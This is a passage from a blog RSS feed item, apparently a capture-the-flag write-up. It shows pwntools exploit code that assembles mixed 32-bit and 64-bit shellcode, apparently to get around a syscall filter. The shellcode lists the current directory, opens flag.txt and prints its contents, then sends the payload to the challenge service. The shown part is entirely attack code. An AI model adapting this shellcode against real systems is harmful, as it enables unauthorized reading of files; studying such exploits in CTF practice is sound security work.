<a class="sourceLine" id="cb1-72" title="72">shellcode <span class="op">=</span> asm(<span class="st">&quot;&quot;&quot;</span></a>
<a class="sourceLine" id="cb1-73" title="73"><span class="st">    // x86  arg[0]=ebx arg[1]=ecx arg[2]=edx arg[3]=esi arg[4]=edi  arg[5]=ebp</span></a>
<a class="sourceLine" id="cb1-74" title="74"><span class="st">    //  mmap2(0x500000, 0x5000, 3, 1048610, 0, 0)</span></a>
<a class="sourceLine" id="cb1-75" title="75"><span class="st">    mov rax, 0xc0</span></a>
<a class="sourceLine" id="cb1-76" title="76"><span class="st">    mov rbx, 0x500000</span></a>
<a class="sourceLine" id="cb1-77" title="77"><span class="st">    mov rcx, 0x5000</span></a>
<a class="sourceLine" id="cb1-78" title="78"><span class="st">    mov rdx, 3</span></a>
<a class="sourceLine" id="cb1-79" title="79"><span class="st">    mov rsi, 1048610</span></a>
<a class="sourceLine" id="cb1-80" title="80"><span class="st">    xor rdi, rdi</span></a>
<a class="sourceLine" id="cb1-81" title="81"><span class="st">    xor rbp, rbp</span></a>
<a class="sourceLine" id="cb1-82" title="82"><span class="st">    int 0x80</span></a>
<a class="sourceLine" id="cb1-83" title="83"></a>
<a class="sourceLine" id="cb1-84" title="84"><span class="st">    mov rsp,0x500a00</span></a>
<a class="sourceLine" id="cb1-85" title="85"></a>
<a class="sourceLine" id="cb1-86" title="86"><span class="st">    // 5 ==&gt; 64bit:fstat   32bit:open</span></a>
<a class="sourceLine" id="cb1-87" title="87"><span class="st">    // open(&quot;.&quot;, 0, 0)</span></a>
<a class="sourceLine" id="cb1-88" title="88"><span class="st">    mov rax, 5</span></a>
<a class="sourceLine" id="cb1-89" title="89"><span class="st">    push 0x2e </span></a>
<a class="sourceLine" id="cb1-90" title="90"><span class="st">    mov rbx, rsp</span></a>
<a class="sourceLine" id="cb1-91" title="91"><span class="st">    xor rcx, rcx</span></a>
<a class="sourceLine" id="cb1-92" title="92"><span class="st">    int 0x80</span></a>
<a class="sourceLine" id="cb1-93" title="93"></a>
<a class="sourceLine" id="cb1-94" title="94"><span class="st">    // getents(fd1, $rsp, 0x1337)</span></a>
<a class="sourceLine" id="cb1-95" title="95"><span class="st">    mov rbx, rax</span></a>
<a class="sourceLine" id="cb1-96" title="96"><span class="st">    mov rax, 0x8d</span></a>
<a class="sourceLine" id="cb1-97" title="97"><span class="st">    mov rcx, rsp</span></a>
<a class="sourceLine" id="cb1-98" title="98"><span class="st">    mov rdx, 0x1337</span></a>
<a class="sourceLine" id="cb1-99" title="99"><span class="st">    int 0x80</span></a>
<a class="sourceLine" id="cb1-100" title="100"></a>
<a class="sourceLine" id="cb1-101" title="101"><span class="st">    // rsp+0x7e ==&gt;  flag.txt</span></a>
<a class="sourceLine" id="cb1-102" title="102"><span class="st">    mov rbx, rsp</span></a>
<a class="sourceLine" id="cb1-103" title="103"><span class="st">    add rbx, 0x7e</span></a>
<a class="sourceLine" id="cb1-104" title="104"></a>
<a class="sourceLine" id="cb1-105" title="105"><span class="st">    // open</span></a>
<a class="sourceLine" id="cb1-106" title="106"><span class="st">    mov rax, 5</span></a>
<a class="sourceLine" id="cb1-107" title="107"><span class="st">    xor rcx, rcx</span></a>
<a class="sourceLine" id="cb1-108" title="108"><span class="st">    xor rdx, rdx</span></a>
<a class="sourceLine" id="cb1-109" title="109"><span class="st">    int 0x80</span></a>
<a class="sourceLine" id="cb1-110" title="110"></a>
<a class="sourceLine" id="cb1-111" title="111"><span class="st">    // RW</span></a>
<a class="sourceLine" id="cb1-112" title="112"><span class="st">    mov rdi, rax</span></a>
<a class="sourceLine" id="cb1-113" title="113"><span class="st">    mov rsi, rsp</span></a>
<a class="sourceLine" id="cb1-114" title="114"><span class="st">    mov rdx, 0x100</span></a>
<a class="sourceLine" id="cb1-115" title="115"><span class="st">    xor rax, rax</span></a>
<a class="sourceLine" id="cb1-116" title="116"><span class="st">    syscall</span></a>
<a class="sourceLine" id="cb1-117" title="117"></a>
<a class="sourceLine" id="cb1-118" title="118"><span class="st">    mov rdi, 1</span></a>
<a class="sourceLine" id="cb1-119" title="119"><span class="st">    mov rax, 1</span></a>
<a class="sourceLine" id="cb1-120" title="120"><span class="st">    syscall</span></a>
<a class="sourceLine" id="cb1-121" title="121"><span class="st">&quot;&quot;&quot;</span>, arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</a>
<a class="sourceLine" id="cb1-122" title="122">sleep(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb1-123" title="123">p.sendafter(b<span class="st">&#39;Hello World Setup Wizard</span><span class="ch">\n\x1b</span><span class="st">[0m&#39;</span>, <span class="st">&#39;</span><span class="ch">\x90</span><span class="st">&#39;</span><span class="op">+</span>shellcode)</a>
<a class="sourceLine" id="cb1-124" title="124"></a>
<a class="sourceLine" id="cb1-125" title="125"><span class="co"># debug(p)</span></a>
<a class="sourceLine" id="cb1-126" title="126">p.interactive()</a></code></pre></div>]]></description>
    <pubDate>Tue, 11 Oct 2022 16:59:01 +0800</pubDate>
  </item>
  
</channel>
</rss>
